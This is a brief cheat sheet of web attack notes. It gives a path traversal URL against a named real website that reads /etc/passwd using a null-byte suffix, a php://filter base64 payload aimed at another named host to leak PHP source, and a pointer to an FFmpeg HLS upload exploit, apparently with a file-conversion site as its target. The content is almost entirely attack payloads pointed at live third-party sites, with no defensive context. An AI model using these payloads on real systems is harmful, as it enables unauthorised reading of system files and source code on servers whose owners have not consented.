# Path Traversal

```
http://party.popelka-webdesign.eu/fotogalerie.php?id=
http://party.popelka-webdesign.eu/fotogalerie.php?id=../../../../../../../../../../etc/passwd%00
Fuzzing + Payloads 
```

### PHP Wrappers

```
php://filter/convert.base64-encode/resource=index
```

```
http://dns2.consulintel.es/index.php?page=php://filter/convert.base64-encode/resource=index
```

### Video Converters bug

```
avi File -> FFMPEG -> MP4 File 
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files/CVE%20Ffmpeg%20HLS
https://www.files-conversion.com/
```
